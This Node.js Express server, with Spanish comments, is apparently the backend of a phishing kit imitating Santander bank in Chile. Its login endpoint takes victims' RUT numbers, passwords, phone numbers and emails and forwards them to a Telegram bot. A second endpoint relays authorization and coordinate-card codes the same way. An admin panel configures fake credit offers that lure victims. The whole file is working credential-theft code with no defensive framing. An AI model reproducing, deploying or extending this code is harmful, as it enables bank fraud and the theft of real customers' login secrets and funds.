const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const path = require("path");
const fs = require("fs");

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];

const CONFIG_FILE = path.join(__dirname, "config.json");

// Configuración inicial
let config = {};
if (fs.existsSync(CONFIG_FILE)) {
  config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
} else {
  config = {
    producto1: "Línea de Crédito",
    monto1: 0,
    producto2: "Tarjeta de Crédito WorldMember Limited Business",
    monto2: 0,
    producto3: "Visualización de Tarjeta",   // 👈 sin monto
    tipoAutorizacion: "santander",
    coord1: "",
    coord2: "",
    coord3: "",
    factibilidad: "off"
  };
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

// Login
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, telefono, mail } = req.body;

  if (!telefono && !mail) {
    return res.status(400).send("❌ Debes ingresar teléfono o correo.");
  }

  if (rut && bloqueados.includes(rut)) {
    return res.status(403).send("❌ Tu clave digital ha sido bloqueada.");
  }

  let mensaje = "📩 Inicio de sesión en AutOB:\n";
  if (rut) mensaje += `🆔 RUT: ${rut}\n`;
  if (passwd) mensaje += `🔑 Contraseña: ${passwd}\n`;
  if (telefono) mensaje += `📱 Teléfono: ${telefono}\n`;
  if (mail) mensaje += `📧 Correo: ${mail}\n`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("✅ Datos enviados correctamente.");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar tus datos.");
  }
});

// Autorización general
app.post("/autorizar", async (req, res) => {
  const { mensaje } = req.body;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });
    res.send("✅ Autorización enviada.");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar la autorización.");
  }
});

// Coordenadas dinámicas
app.get("/coordenadas", (req, res) => {
  const letras = ["A","B","C","D","E","F"];
  const seleccion = letras.sort(() => 0.5 - Math.random()).slice(0,3);
  res.json({ coordenadas: seleccion });
});

// Configuración
app.get("/config", (req, res) => {
  res.json(config);
});

app.post("/config", (req, res) => {
  // Normalizar valores recibidos desde admin
  config.producto1 = req.body.producto1 || "";
  config.monto1 = req.body.monto1 || 0;

  config.producto2 = req.body.producto2 || "";
  config.monto2 = req.body.monto2 || 0;

  config.producto3 = req.body.producto3 || ""; // 👈 sin monto

  config.tipoAutorizacion = req.body.tipoAutorizacion || "santander";
  config.coord1 = req.body.coord1 || "";
  config.coord2 = req.body.coord2 || "";
  config.coord3 = req.body.coord3 || "";
  config.factibilidad = req.body.factibilidad || config.factibilidad;

  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
  res.json(config);
});

// Autorización según tipo
app.get("/autorizacion", (req, res) => {
  if (config.tipoAutorizacion === "coordenadas") {
    return res.sendFile(path.join(__dirname, "public", "coordenadas.html"));
  } else {
    return res.sendFile(path.join(__dirname, "public", "pass.html"));
  }
});

// Factibilidad
app.get("/factibilidad", (req, res) => {
  if (config.factibilidad === "on") {
    return res.sendFile(path.join(__dirname, "public", "creditCardEvaluation.html"));
  } else {
    return res.send("❌ La opción de factibilidad está deshabilitada en el panel de administración.");
  }
});

// Visualización de tarjeta
app.get("/visualizacion-tarjeta", (req, res) => {
  return res.sendFile(path.join(__dirname, "public", "creditCardVisualization.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en el puerto ${PORT}`);
});
